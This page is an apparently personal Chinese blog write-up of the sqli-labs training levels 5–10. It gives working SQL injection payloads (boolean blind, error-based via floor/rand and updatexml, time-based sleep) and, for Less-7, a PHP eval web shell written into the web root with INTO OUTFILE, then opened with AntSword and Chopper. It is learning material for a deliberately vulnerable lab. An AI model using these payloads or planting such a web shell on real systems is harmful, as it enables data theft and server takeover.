<!DOCTYPE HTML>
<html>

<head>
	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
	<link rel="shortcut icon" href="/img/logo_miccall.png">
	
			    <title>
    liquor's blog
    </title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
    <link rel="stylesheet" href="/css/mic_main.css" />
    <link rel="stylesheet" href="/css/dropdownMenu.css" />
    <meta name="keywords" content="miccall" />
    
    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
	 
    <noscript>
        <link rel="stylesheet" href="/css/noscript.css" />
    </noscript>
    <style type="text/css">
        body:before {
          content: ' ';
          position: fixed;
          top: 0;
          background: url('/img/bg.gif') center 0 no-repeat;
          right: 0;
          bottom: 0;
          left: 0;
          background-size: cover; 
        }
    </style>

			    
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


    <script src="/js/jquery.min.js"></script>
    <script src="/js/jquery.scrollex.min.js"></script>
    <script src="/js/jquery.scrolly.min.js"></script>
    <script src="/js/skel.min.js"></script>
    <script src="/js/util.js"></script>
    <script src="/js/main.js"></script>
	
<meta name="generator" content="Hexo 5.2.0"></head>
    
		
<!-- Layouts -->



<!--  代码渲染  -->
<link rel="stylesheet" href="/css/prism_coy.css" />
<link rel="stylesheet" href="/css/typo.css" />
<!-- 文章页 -->
<body class="is-loading">
    <!-- Wrapper 外包 s-->
    <div id="wrapper" class="fade-in">
        <!-- Intro 头部显示 s -->
        <!-- Intro 头部显示 e -->
        <!-- Header 头部logo start -->
        <header id="header">
    <a href="/" class="logo">Yu Ting</a>
</header>
        <!-- Nav 导航条 start -->
        <nav id="nav" class="special" >
            <ul class="menu links" >
			<!-- Homepage  主页  --> 
			<li >
	            <a href="/" rel="nofollow">主页</a>
	        </li>
			<!-- categories_name  分类   --> 
	        
	        <li class="active">
	            <a href="#s1">分类</a>
	                    <ul class="submenu">
	                        <li>
	                        
	                    </ul>
	        </li>
	        
	        <!-- archives  归档   --> 
	        
	        
		        <!-- Pages 自定义   -->
		        
		        <li>
		            <a href="/about/" title="简历">
		                简历
		            </a>
		        </li>
		        
		        <li>
		            <a href="/group/" title="团队">
		                团队
		            </a>
		        </li>
		        
		        <li>
		            <a href="/gallery/" title="图库">
		                图库
		            </a>
		        </li>
		        
		        <li>
		            <a href="/tag/" title="标签">
		                标签
		            </a>
		        </li>
		        


            </ul>
            <!-- icons 图标   -->
			<ul class="icons">
                    
                    <li>
                        <a title="github" href="https://github.com/miccall" target="_blank" rel="noopener">
                            <i class="icon fa fa-github"></i>
                        </a>
                    </li>
                    
                    <li>
                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
                            <i class="icon fa fa-500px"></i>
                        </a>
                    </li>
                    
			</ul>
</nav>

        <div id="main" >
            <div class ="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >sqli-labs（二）</h2></a>
            </div>
            <!-- Post -->
            <div class="typo" style="padding: 3rem;">
                <h1 id="Sqli-labs–2"><a href="#Sqli-labs–2" class="headerlink" title="Sqli-labs–2"></a>Sqli-labs–2</h1><ul>
<li><a href="#sqli-labs--2">Sqli-labs–2</a><ul>
<li><a href="#%E6%B3%95%E4%B8%80%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5">法一:联合注入</a><ul>
<li><a href="#%E7%9B%B2%E6%B3%A8%E7%8C%9C%E8%A7%A3less-5">盲注猜解Less-5</a><ul>
<li><a href="#1%E8%AF%95%E6%8E%A2">1.试探:</a></li>
<li><a href="#2%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6">2.<strong>猜数据库名长度</strong>:</a></li>
<li><a href="#3%E7%8C%9C%E5%BA%93%E5%90%8D">3.<strong>猜库名：</strong></a></li>
<li><a href="#4%E7%88%86%E8%A1%A8"><strong>4.爆表：</strong></a></li>
<li><a href="#5%E7%88%86%E5%88%97"><strong>5.爆列：</strong></a></li>
<li><a href="#6%E7%88%86%E5%80%BC"><strong>6.爆值：</strong></a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%B3%95%E4%BA%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">法二：报错注入</a><ul>
<li><a href="#less-6">Less-6</a><ul>
<li><a href="#1%E8%AF%95%E6%8E%A2-1">1.试探</a></li>
<li><a href="#2%E7%88%86%E5%BA%93%E5%90%8D">2.爆库名</a></li>
<li><a href="#3%E7%88%86%E8%A1%A8">3.爆表</a></li>
<li><a href="#4%E7%88%86%E5%88%97">4.爆列</a></li>
<li><a href="#5%E7%88%86%E5%80%BC">5.爆值</a></li>
</ul>
</li>
<li><a href="#less-7">Less-7</a><ul>
<li><a href="#1%E8%AF%95%E6%8E%A2-2">1.试探</a></li>
<li><a href="#2%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">2.获取文件路径</a><ul>
<li><a href="#%E6%B3%95%E4%B8%80">法一：</a></li>
<li><a href="#%E6%B3%95%E4%BA%8C">法二：</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%B3%95%E4%B8%89%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">法三：时间盲注</a></li>
<li><a href="#less-8">Less-8</a><ul>
<li><a href="#1%E8%AF%95%E6%8E%A2-3">1.试探</a></li>
<li><a href="#2%E7%88%86%E5%BA%93%E9%95%BF">2.爆库长</a></li>
<li><a href="#3%E7%88%86%E5%BA%93">3.爆库</a></li>
<li><a href="#4%E7%88%86%E8%A1%A8-1">4.爆表</a></li>
<li><a href="#5%E7%88%86%E5%88%97-1">5.爆列</a></li>
<li><a href="#6%E7%88%86%E5%80%BC-1">6.爆值</a><ul>
<li><a href="#less-9">Less-9</a></li>
<li><a href="#less-10">Less-10</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="法一-联合注入"><a href="#法一-联合注入" class="headerlink" title="法一:联合注入"></a>法一:联合注入</h2><h3 id="盲注猜解Less-5"><a href="#盲注猜解Less-5" class="headerlink" title="盲注猜解Less-5"></a>盲注猜解Less-5</h3><h4 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探:"></a>1.试探:</h4><p>插入<code>?id=1&#39;</code>报错，但未报错时页面并没有任何信息的回显；执行SQL语句后，若语句查询到匹配的数据会显示‘You are in……如果SQL语句没有查询到匹配的数据就不回显；如果语句有错误就显示错误的信息；故判断其为盲注。前四节都是通过闭合sql语句注入，这里只能通过数据库报错来获取想要的数据，原理：将group by与一个聚合函数一起使用，如count(*)，可以将想要查询的内容作为错误信息返回。</p>
<h4 id="2-猜数据库名长度"><a href="#2-猜数据库名长度" class="headerlink" title="2.猜数据库名长度:"></a>2.<strong>猜数据库名长度</strong>:</h4><p><code>’ and length (database())=8--+</code>试到8时回显正常</p>
<p><img src="/2020/11/09/sqli-labs/1.jpg" alt="1"></p>
<h4 id="3-猜库名："><a href="#3-猜库名：" class="headerlink" title="3.猜库名："></a>3.<strong>猜库名：</strong></h4><p><code>&#39; and left((select database()),1)=&#39;s&#39;--+</code>回显正常，再探寻第二个字母<code>&#39; and left((select database()),2)=&#39;sy&#39;--+</code>报错：</p>
<p><img src="/2020/11/09/sqli-labs/3.jpg" alt="3"></p>
<p>将y换成e后正常，依次推出八位数（经漫长的试探…….）得出库名security。security的十六进制=<strong>0x7365637572697479</strong></p>
<h4 id="4-爆表："><a href="#4-爆表：" class="headerlink" title="4.爆表："></a><strong>4.爆表：</strong></h4><p><code>union Select 1,count(*),concat(0x3a,0x3a,( select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code></p>
<p><img src="/2020/11/09/sqli-labs/4.jpg" alt="4"></p>
<h4 id="5-爆列："><a href="#5-爆列：" class="headerlink" title="5.爆列："></a><strong>5.爆列：</strong></h4><p><code> union Select 1,count(*),concat(0x3a,0x3a,( select column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name=&#39;users&#39; limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code><img src="/2020/11/09/sqli-labs/5.jpg" alt="5"></p>
<h4 id="6-爆值："><a href="#6-爆值：" class="headerlink" title="6.爆值："></a><strong>6.爆值：</strong></h4><p><code>union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code><img src="/2020/11/09/sqli-labs/6.jpg" alt="6"></p>
<h2 id="法二：报错注入"><a href="#法二：报错注入" class="headerlink" title="法二：报错注入"></a>法二：报错注入</h2><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><h4 id="1-试探-1"><a href="#1-试探-1" class="headerlink" title="1.试探"></a>1.试探</h4><p>用<code>?id=1&quot;</code>时报错，加上<code>--+</code>时回显正常。</p>
<h4 id="2-爆库名"><a href="#2-爆库名" class="headerlink" title="2.爆库名"></a>2.爆库名</h4><p><code>and updatexml(1,concat(0x7e,database(),0x7e),1)%23 </code>(0x7e是十六进制的“~”)</p>
<p><img src="/2020/11/09/sqli-labs/10.jpg" alt="10"></p>
<h4 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h4><p><code>and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</code></p>
<p><img src="/2020/11/09/sqli-labs/11.jpg" alt="11"></p>
<h4 id="4-爆列"><a href="#4-爆列" class="headerlink" title="4.爆列"></a>4.爆列</h4><p><code>and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),0x7e),1)%23</code></p>
<p><img src="/2020/11/09/sqli-labs/12.jpg" alt="12"></p>
<h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值</h4><p><code>and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23</code>因updatexml()函数最多只能爆32个字符故用<code>limit 0,1</code>一一查询</p>
<p><img src="/2020/11/09/sqli-labs/13.jpg" alt="13"></p>
<p><img src="/2020/11/09/sqli-labs/18.jpg" alt="18"></p>
<p>……还有很多，不一一列举。</p>
<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><h4 id="1-试探-2"><a href="#1-试探-2" class="headerlink" title="1.试探"></a>1.试探</h4><p>输入<code>id=1&#39;</code>报错，用–+注释掉后仍报错；尝试加一个括号，还是报错，再加一个，回显正常。<img src="/2020/11/09/sqli-labs/8.jpg" alt="8"></p>
<h4 id="2-获取文件路径"><a href="#2-获取文件路径" class="headerlink" title="2.获取文件路径"></a>2.获取文件路径</h4><p>科普小知识：</p>
<p>@@datadir 读取数据库路径;@@basedir MYSQL 获取安装路径</p>
<p>一句话木马:本关用到php版本的一句话木马：<code>&lt;?php @eval($_POST[“cmd”]);?&gt; </code></p>
<p>load_file(): 读取本地文件; into outfile :写文件;</p>
<p>用命令<code>union select 1,@@basedir,@@datadir --+</code>在低关卡查询文件的相对路径<img src="/2020/11/09/sqli-labs/9.jpg" alt="9"></p>
<h6 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h6><p>根据以上查询的文件地址使用<code>?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\phpstudy_pro\WWW\\sql\\hhh.php&quot;--+</code>语句新建php文件便于后续闯关。(<strong>路径需要用<code>\\</code>这点一定要记住</strong>)</p>
<p>蚁剑:</p>
<p><img src="/2020/11/09/sqli-labs/26.jpg" alt="26"></p>
<p>注：密码为木马语句post框里的内容。</p>
<p>打开：</p>
<p><img src="/2020/11/09/sqli-labs/27.jpg" alt="27"></p>
<p>也可以用菜刀：</p>
<p><img src="/2020/11/09/sqli-labs/28.jpg" alt="28"></p>
<p>路径里的文件名一定要对，我刚开始下了菜刀，然后看了一个教程里面对文件命名为test.php;我自己命名为hhh.php，然后再编辑数据的时候输入了test.php……为此我还觉得是菜刀出了问题，然后下了蚁剑，还是不行，最后发现我的文件名错了！！!因为这个憨憨问题，我从13号晚上开始困惑了一天……</p>
<h6 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h6><p>使用<code>?id=1&#39;)) union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\test.php&quot;--+</code></p>
<p>可以在目录下发现text.php文件</p>
<p><img src="/2020/11/09/sqli-labs/19.jpg" alt="19"></p>
<p>爆数据库名</p>
<p><code>union select 1,user(),database() into outfile D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\a.php&quot;</code><img src="/2020/11/09/sqli-labs/21.jpg" alt="21"></p>
<p>爆表</p>
<p><code>union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; into outfile</code></p>
<p><img src="/2020/11/09/sqli-labs/22.jpg" alt="22"></p>
<p>爆字段</p>
<p><code>union select 1,2,column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; into outfile</code><img src="/2020/11/09/sqli-labs/23.jpg" alt="23"></p>
<p>爆值</p>
<p><code>union select * from users into outfile</code><img src="/2020/11/09/sqli-labs/24.jpg" alt="24"></p>
<h2 id="法三：时间盲注"><a href="#法三：时间盲注" class="headerlink" title="法三：时间盲注"></a>法三：时间盲注</h2><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><h4 id="1-试探-3"><a href="#1-试探-3" class="headerlink" title="1.试探"></a>1.试探</h4><p><code>id=1&#39;</code>报错，用<code>--+</code>注释后回显正常。（其实标题就看得出来……）</p>
<h4 id="2-爆库长"><a href="#2-爆库长" class="headerlink" title="2.爆库长"></a>2.爆库长</h4><p><code>?id=1&#39; and if(length(database())=8,sleep(5),1)--+</code><img src="/2020/11/09/sqli-labs/25.jpg" alt="25"></p>
<p>图中圈圈在值为8的时候延迟了，故值为8</p>
<h4 id="3-爆库"><a href="#3-爆库" class="headerlink" title="3.爆库"></a>3.爆库</h4><p><code>?id=1&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+</code></p>
<p>与上述一样故值为s;接着增加left(database(),字符长度)中的字符长度，等号右边依次爆破下一个字符，正确匹配时会延迟，（经过漫长试探）最终爆破得到left(database(),8)=’security’。</p>
<h4 id="4-爆表"><a href="#4-爆表" class="headerlink" title="4.爆表"></a>4.爆表</h4><p><code>?id=1&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#39;users&#39; ,sleep(5),1)--+</code></p>
<p>得出表名为users。</p>
<h4 id="5-爆列"><a href="#5-爆列" class="headerlink" title="5.爆列"></a>5.爆列</h4><p><code>?id=1&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 5,1),8)=&#39;password&#39; ,sleep(5),1) --+</code></p>
<p>在limit5,1的时候查到了password，在limit4,1时查到了username.</p>
<h4 id="6-爆值"><a href="#6-爆值" class="headerlink" title="6.爆值"></a>6.爆值</h4><p><code>?id=1&#39; and if(left((select password from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+</code></p>
<p><code>?id=1&#39; and if(left((select username from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+</code></p>
<p>所以第一个用户的名字dumb，密码dumb；在经过漫长的尝试依次查出其余的值。</p>
<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>输入一系列符号，发现一直you are in ……;判断为时间盲注。输入<code>?id=1&#39; and sleep(5) --+</code>所以为单引号盲注。接下去和第八关的时间盲注步骤相似。</p>
<h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>试探为时间盲注，<code>?id=1&quot; and sleep(5) --+</code>延迟，故为双引号盲注，接下去与第八关相似。</p>

            </div>

            <!-- Post Comments -->
            
    <!-- 使用 DISQUS_CLICK -->
<div id="disqus-comment">
    <div id="disqus_thread"></div>

<!-- add animation -->
<style>
	.disqus_click_btn {
            line-height: 30px;
            margin: 0;
            min-width: 50px;
            padding: 0 14px;
            display: inline-block;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-size: 14px;
            font-weight: 400;
            text-transform: uppercase;
            letter-spacing: 0;
            overflow: hidden;
            will-change: box-shadow;
            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
            outline: 0;
            cursor: pointer;
            text-decoration: none;
            text-align: center;
            vertical-align: middle;
            border: 0;
            background: rgba(158, 158, 158, .2);
            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
            color: #fff;
            background-color: #7EC0EE;
            text-shadow: 0
        }
</style>
	
<div class="btn_click_load" id="disqus_bt"> 
    <button class="disqus_click_btn">点击查看评论</button>
</div>

<!--
<script type="text/javascript">
$('.btn_click_load').click(function() {
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();

    document.getElementById('disqus_bt').style.display = "none";
});
</script>
-->
<script type="text/javascript">
    var disqus_config = function () {
        this.page.url = 'http://liquor-boop.github.io/2020/11/09/sqli-labs/';  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = 'http://liquor-boop.github.io/2020/11/09/sqli-labs/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
</script>

<script type="text/javascript">
    $('.btn_click_load').click(function() {  //click to load comments
        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document;
            var s = d.createElement('script');
            s.src = '//http-miccall-tech.disqus.com/embed.js';
            s.setAttribute('data-timestamp', + new Date());
            (d.head || d.body).appendChild(s);
        })();
        $('.btn_click_load').css('display','none');
    });
</script>
</div>
<style>
    #disqus-comment{
        background-color: #eee;
        padding: 2pc;
    }
</style>


        </div>
        <!-- Copyright 版权 start -->
                <div id="copyright">
            <ul>
                <li>&copy;Powered By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
                <li>Design: <a target="_blank" rel="noopener" href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
            </ul>
            
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
			
        </div>
    </div>
</body>



 	
</html>
